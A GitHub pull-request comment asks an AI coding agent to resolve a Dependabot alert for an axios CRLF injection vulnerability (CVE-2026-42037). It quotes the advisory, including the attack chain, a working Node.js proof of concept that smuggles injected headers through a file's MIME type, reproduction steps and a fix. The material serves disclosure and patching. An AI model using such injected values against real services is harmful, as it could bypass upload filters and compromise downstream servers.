@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** axios (npm)
- **Severity:** MEDIUM
- **Vulnerable versions:** >= 1.0.0, < 1.15.1
- **Patched version:** 1.15.1
- **CVE:** CVE-2026-42037
- **GHSA:** GHSA-445q-vr5w-6q77
- **Manifest:** pnpm-lock.yaml

**Summary:**
Axios: CRLF Injection in multipart/form-data body via unsanitized blob.type in formDataToStream

**Description:**
### Summary
The `FormDataPart` constructor in `lib/helpers/formDataToStream.js` interpolates `value.type` directly into the `Content-Type` header of each multipart part without sanitizing CRLF (`\r\n`) sequences. An attacker who controls the `.type` property of a Blob/File-like object (e.g., via a user-uploaded file in a Node.js proxy service) can inject arbitrary MIME part headers into the multipart form-data body. This bypasses Node.js v18+ built-in header protections because the injection targets the multipart body structure, not HTTP request headers.

### Details
In `lib/helpers/formDataToStream.js` at line 27, when processing a Blob/File-like value, the code builds per-part headers by directly embedding value.type:
```
if (isStringValue) {
  value = textEncoder.encode(String(value).replace(/\r?\n|\r\n?/g, CRLF));
} else {
  // value.type is NOT sanitized for CRLF sequences
  headers += `Content-Type: ${value.type || 'application/octet-stream'}${CRLF}`;
}
```
Note that the string path (line above) explicitly sanitizes CRLF, but the binary/blob path does not. This inconsistency confirms the sanitization was intended but missed for `value.type`.


### Attack chain:

1. Attacker uploads a file to a Node.js proxy service, supplying a crafted MIME type containing `\r\n` sequences
2. The proxy appends the file to a FormData and posts it via `axios.post(url, formData)`
3. axios calls `formDataToStream()`, which passes `value.type` unsanitized into the multipart body
4. The downstream server receives a multipart body containing injected per-part headers
5. The server's multipart parser processes the injected headers as legitimate

This is reachable via the fully public axios API (`axios.post(url, formData)`) with no special configuration.
Additionally, `value.name` used in the `Content-Disposition` construction nearby likely has the same issue and should be audited.

### PoC
**Prerequisites**: Node.js 18+, axios (tested on 1.14.0)
```
const http = require('http');
const axios = require('axios');

let receivedBody = '';

const server = http.createServer((req, res) => {
  let body = '';
  req.on('data', chunk => { body += chunk.toString(); });
  req.on('end', () => {
    receivedBody = body;
    res.writeHead(200);
    res.end('ok');
  });
});

server.listen(0, '127.0.0.1', async () => {
  const port = server.address().port;

  class SpecFormData {
    constructor() {
      this._entries = [];
      this[Symbol.toStringTag] = 'FormData';
    }
    append(name, value) { this._entries.push([name, value]); }
    [Symbol.iterator]() { return this._entries[Symbol.iterator](); }
    entries() { return this._entries[Symbol.iterator](); }
  }

  const fd = new SpecFormData();

  fd.append('photo', {
    type: 'image/jpeg\r\nX-Injected-Header: PWNED-by-attacker\r\nX-Evil: arbitrary-value',
    size: 16,
    name: 'photo.jpg',
    [Symbol.asyncIterator]: async function*() {
      yield Buffer.from('MALICIOUS PAYLOAD');
    }
  });

  await axios.post(`http://127.0.0.1:${port}/upload`, fd);

  if (receivedBody.includes('X-Injected-Header: PWNED-by-attacker')) {
    console.log('[VULNERABLE] CRLF injection confirmed in multipart body');
    console.log('Received body:\n' + receivedBody);
  } else {
    console.log('[NOT_VULNERABLE]');
  }

  server.close();
});
```

### Steps to reproduce:

1. npm install axios
2. Save the above as poc_axios_crlf.js
3. Run node poc_axios_crlf.js
4. Observe the output shows [VULNERABLE] with injected headers visible in the multipart body

**Expected behavior**: value.type should be sanitized to strip \r\n before interpolation, consistent with the string value path.
**Actual behavior**: CRLF sequences in value.type are preserved, allowing arbitrary header injection in multipart parts.

### Impact
Any Node.js application that accepts user-provided files (with attacker-controlled MIME types) and re-posts them via axios FormData is affected. This is a common pattern in proxy services, file upload relays, and API gateways.
Consequences include: bypassing server-side Content-Type-based upload filters, confusing multipart parsers into misrouting data, injecting phantom form fields if the boundary is known, and exploiting downstream server vulnerabilities that trust per-part headers.
axios is one of the most downloaded npm packages, significantly increasing the blast radius of this issue.

### Suggested fix
In formDataToStream.js, sanitize value.type before interpolating it into the per-part Content-Type header. Apply the same strategy used for string values (strip/replace \r\n) or use the same escapeName logic.
```
const safeType = (value.type || 'application/octet-stream')
  .replace(/[\r\n]/g, '');
headers += `Content-Type: ${safeType}${CRLF}`;
```

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/2056)
